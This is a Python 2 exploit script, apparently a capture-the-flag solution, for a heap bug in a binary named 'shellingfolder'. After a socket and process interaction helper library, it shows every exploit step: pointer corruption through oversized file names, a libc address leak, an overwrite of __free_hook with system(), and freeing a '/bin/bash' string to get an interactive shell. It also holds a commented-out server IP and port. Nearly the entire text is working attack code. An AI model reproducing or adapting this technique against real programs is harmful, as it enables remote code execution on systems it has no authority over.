import sys, os, socket, select, subprocess
from sys import stdout, stdin, stderr
from struct import pack, unpack
from time import sleep
from binascii import hexlify

def isascii(s):
  allowed = b'\r\n\t'
  if type(s[0]) == bytes:
    return all(32 <= ord(c) < 127 or c in allowed for c in s)
  else:
    allowed = map(ord, allowed)
    return all(32 <= c < 127 or c in allowed for c in s)

def trypass(lmbda):
  try: return lmbda()
  except: return None

CRST, CRED, CGRN, CYLW, CBLU, CMGT, CCYN = b'\x1B[0m', b'\x1B[31m', b'\x1B[32m', b'\x1B[33m', b'\x1B[34m', b'\x1B[35m', b'\x1B[36m'

def chunksof(l, n, filler = None):
  if len(l) < n:
    yield l if filler is None else (l+filler)[:n]
    return
  for i in xrange(0, len(l)-n+1, n):
    yield l[i:i+n]
  if i+n < len(l):
    yield l[i+n:] if filler is None else (l[i+n:] + filler)[:n]

class printer(object):
  def __init__(self, outgoing=False, file=stdout):
    self.outgoing = outgoing
    self.charsprinted = 0
    self.file = file
    self.prevHex = False
  def __enter__(self):
    self.file.write((CGRN if self.outgoing else CMGT)+'<'+CRST)
    self.file.flush()
    return self
  def __exit__(self, type, value, tb):
    self.file.write((CGRN if self.outgoing else CMGT)+'>'+CRST)
    self.file.flush()
  def __call__(self, s, hex=None):
    if not s: return
    if hex is False:
      self.file.write(s)
      self.charsprinted += len(s)
      return
    for c in s:
      thisHex = hex is True or (hex is None and not isascii(c))
      if self.charsprinted > 0 and self.charsprinted % 4 == 0 and (self.prevHex or thisHex):
        self.file.write(CBLU+'_'+CRST)
      if not thisHex:
        self.file.write(c)
      else:
        self.file.write(CBLU+hexlify(c)+CRST)
      self.prevHex = thisHex
      self.charsprinted += 1
    self.file.flush()

sock, proc, wfile, rfile = None, None, None, None

def excepthook(exc_type, exc_value, exc_traceback):
  from traceback import print_exception, print_tb, print_exc
  stderr.write('\n'+CRED+'---'+CRST+'\nTraceback (most recent call last):\n')
  print_tb(exc_traceback, file=stderr)
  stderr.write(CRED)
  print_exception(exc_type, exc_value, None, file=stderr)
  stderr.write(CRST)
  if sock and exc_type != socket.error:
    try:    telnetinteract(sock)
    except: print_exc(file=stderr)

sys.excepthook = excepthook

def connect(*args, **kwargs):
  global launch
  launch = None
  global sock, wfile, rfile
  if sock:
    stderr.write('\n\n'+CYLW+'---new socket'+CRST+'\n')
    trypass(lambda: wfile.close())
    trypass(lambda: rfile.close())
    trypass(lambda: sock.close())
  sock = socket.create_connection(*args, **kwargs)
  wfile = sock.makefile('w', 0)
  rfile = sock.makefile('r', 0)

def interact():
  try:
    stdin_fileno = stdin.fileno()  # select on stdin directly can be wrong.
    while True:
      ready = select.select([rfile, stdin_fileno], [], [])[0]
      if rfile in ready:
        cc = rfile.read(1)
        if len(cc) < 1:
          stderr.write('\n'+CYLW+'---interact: remote died'+CRST+'\n')
          return
        stdout.write(cc)
        stdout.flush()
      if stdin_fileno in ready:
        cc = os.read(stdin_fileno, 1)
        if len(cc) < 1:
          stderr.write('\n'+CYLW+'---interact: stdin closed'+CRST+'\n')
          return
        wfile.write(cc)
  except KeyboardInterrupt:
    stderr.write('\n'+CYLW+'---interact: interrupted'+CRST+'\n')

def telnetinteract(s = None):
  if s is None: s = sock
  with printer() as P:
    while select.select([s], [], [], 0.1)[0]:
      cc = s.recv(1)
      if len(cc) < 1:
        break # Maybe print socket is dead and exit instead.
      P(cc)
  from telnetlib import Telnet
  t = Telnet()
  t.sock = s
  stderr.write('\n'+CYLW+'---telnet interact'+CRST+'\n')
  t.interact()

def launch(*args, **kwargs):
  global connect
  connect = None
  global proc, wfile, rfile
  if proc:
    stderr.write('\n'+CYLW+'---new process'+CRST+'\n')
    trypass(lambda: proc.kill())
  proc = subprocess.Popen(*args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, bufsize=0, **kwargs)
  wfile = proc.stdin
  rfile = proc.stdout
  def killdump():
    proc.kill()
    stderr.write('\n'+CYLW+'---dumping stdout'+CRST+'\n')
    while select.select([rfile], [], [], 0.3)[0]:
      cc = rfile.read(1)
      if len(cc) < 1:
        break
      stdout.write(cc)
  import atexit
  atexit.register(killdump)

def recvuntil(s, hex=None, file=None):
  if file is None: file = rfile
  dat = bytearray()
  with printer() as P:
    while not dat.endswith(s):
      cc = file.read(1)
      assert len(cc) == 1
      P(cc, hex)
      dat.append(cc)
  return bytes(dat[:-len(s)])

def recvn(n, hex=None, file=None):
  if file is None: file = rfile
  dat = bytearray()
  with printer() as P:
    while len(dat) < n:
      cc = file.read(1)
      assert len(cc) == 1
      P(cc, hex)
      dat.append(cc)
  return bytes(dat)

def recvs(s, hex=None, file=None):
  if file is None: file = rfile
  with printer() as P:
    for c in s:
      cc = file.read(1)
      assert len(cc) == 1
      P(cc, hex)
      assert c == cc, CRED+"recvs did not recv what it expected to!"+CRST

def recvany(hex=None, file=None):
  if file is None: file = rfile
  dat = bytearray()
  with printer() as P:
    while select.select([file], [], [], 0.1)[0]:
      cc = file.read(1)
      if len(cc) != 1:
        break
      P(cc, hex)
      dat.append(cc)
  return bytes(dat)

def sendbig(s, hex=None, file=None):
  if file is None: file = wfile
  stdout.write('\n'+CGRN+'<'+CRST)
  stdout.write(s[:20]) if not hex else printer()(s[:20], hex)
  stdout.write('...')
  stdout.flush()
  file.write(s)
  file.flush()
  stdout.write(s[-20:]) if not hex else printer()(s[-20:], hex)
  stdout.write(CGRN+'>'+CRST+'\n')
  stdout.flush()

def send(s, hex=None, file=None):
  if file is None: file = wfile
  if len(s) > 200:
    sendbig(s, hex=hex, file=file)
  else:
    with printer(outgoing=True) as P:
      P(s, hex)
    wfile.write(s)
    wfile.flush()

def pack4(n):
  return pack('<I', n)
def pack8(n):
  return pack('<Q', n)

def recv4(file=None):
  return unpack('<I', recvn(4, hex=True, file=file))[0]
def recv8(file=None):
  return unpack('<Q', recvn(8, hex=True, file=file))[0]

#############################################################################
#############################################################################

def make_folder(name):
  recvuntil('choice:')
  send('3\n')
  assert '\n' not in name
  recvuntil('Name of Folder:')
  send(name+'\n')
  recvs('successful\n')

def make_file(name, size):
  recvuntil('choice:')
  send('4\n')
  assert '\n' not in name
  recvuntil('Name of File:')
  send(name+'\n')
  recvs('Size of File:')
  assert '\n' not in str(size)
  send('%d\n' % unpack('<i', pack('<I', size))[0])
  recvs('successful\n')

def change_folder(name):
  recvuntil('choice:')
  send('2\n')
  assert '\n' not in name
  recvuntil('Choose a Folder :')
  send(name+'\n')
  recvs('successful\n')

def calc_size():
  recvuntil('choice:')
  send('6\n')
  x = recvuntil('The size of the folder is ')
  y = recvuntil('\n')
  return x, y

def list_folder():
  recvuntil('choice:')
  send('1\n')
  recvuntil('----------------------\n')
  return recvuntil('----------------------\n')

def remove_file(name):
  recvuntil('choice:')
  send('5\n')
  assert '\n' not in name
  recvuntil('Choose a Folder or file :')
  send(name+'\n')

#connect(('52.69.237.212', 4869))
launch(['./shellingfolder_42848afa70a13434679fac53a471239255753260'])

#setup bug
for i in range(9):
  make_file('F' + str(i)*21, 100)

# The chr(0x28) will overwrite the low byte of the target pointer, pointing it back
# into the directory's children array. The number then gets added into a child
# pointer, moving it away from a valid struct to some invalid heap location.
make_file('F'*24 + chr(0x28), 48 + (0x5581bcd3e368-0x5581bcd3e2d8+8))

# Free some stuff, so we can find a libc pointers sitting on the heap.
for i in range(5, 8):
  remove_file('F' + str(i)*21)

# trigger bug
calc_size()

# list names, including the of that child pointer we moved to elsewhere in the heap.
# it's always F3333 that gets moved, so, yeah.
data = list_folder()
leak = data.split('\nF222222222222222222222\n', 1)[1].split('\nF444444444444444444444\n', 1)[0]
print repr(leak.ljust(8, '\x00'))
libcptr = unpack('<Q', leak.ljust(8, '\x00'))[0]
print hex(libcptr)
libc_base = libcptr - 0x7fac5d4b8b78 + 0x7fac5d0f5000

free_hook_off = 0x3c57a8
system_off = 0x45380

# Do it again, but this time clobber the whole pointer to be free_hook_off,
# and change it to be system(). Two steps required, since our write is an 32-bit add.
make_folder('newfolder')
change_folder('newfolder')

# Have to struggle a bit because of 32-bit -> 64-bit signed promotion.
# (or we could not bother, and just be fine half the time anyways.)
# I think we might still have a problem when the high bit of highwrite
# needs to be set, but, whatever. We're fine half the time!
lowwrite = (libc_base+system_off)&0xFFFFFFFF
if lowwrite&0x80000000:
  highwrite = ((libc_base+system_off+1)>>32)&0xFFFFFFFF
else:
  highwrite = ((libc_base+system_off)>>32)&0xFFFFFFFF

make_file('G'*24 + pack('<Q', libc_base+free_hook_off).rstrip('\x00'), lowwrite)
make_file('H'*24 + pack('<Q', libc_base+free_hook_off+4).rstrip('\x00'), highwrite)

#raw_input('ready2hack > ')
calc_size()
change_folder('..')

# Now we need to free a '/bin/bash'.
# We do this by making '/bin/bash' strings, and then moving child pointers
# (like we did the first time) so a child file pointer points directly at a '/bin/bash'.
make_folder('newfolder2')
change_folder('newfolder2')
for i in range(9):
  make_file('/bin/bash;', 100)

make_file('F'*24 + chr(0x48), 88)
calc_size()
list_folder()
change_folder('..')
remove_file('newfolder2')

print "Try again if you don't get a shell, this exploit isn't reliable."
print "Srs, it'll fail like 5 times in a row, then work 5 times in a row."
interact()
